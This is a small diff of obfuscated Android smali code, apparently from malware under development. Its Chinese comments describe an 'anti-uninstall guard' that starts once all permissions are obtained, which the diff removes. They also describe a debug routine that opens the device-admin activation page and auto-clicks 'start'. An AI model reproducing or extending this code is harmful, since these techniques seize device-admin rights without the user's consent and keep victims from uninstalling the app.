@@ -685,8 +685,6 @@
     const-wide/16 v1, 0x4e20
     invoke-static {p0, v0, v1, v2}, Lڝږ؁ڋ/ھ;->post(Landroid/content/Context;IJ)V
 
-    # 权限全部到手后，才启用防卸载守卫（调试期由 inject_state.guard_on 决定，默认关）
-    invoke-static {p0}, Lڝږ؁ڋ/ھ;->accGuardStart(Landroid/content/Context;)V
 
 
     # 2.2 调试：权限跑完后 1 秒自动弹设备管理激活页，2.5 秒后自动点“启动”
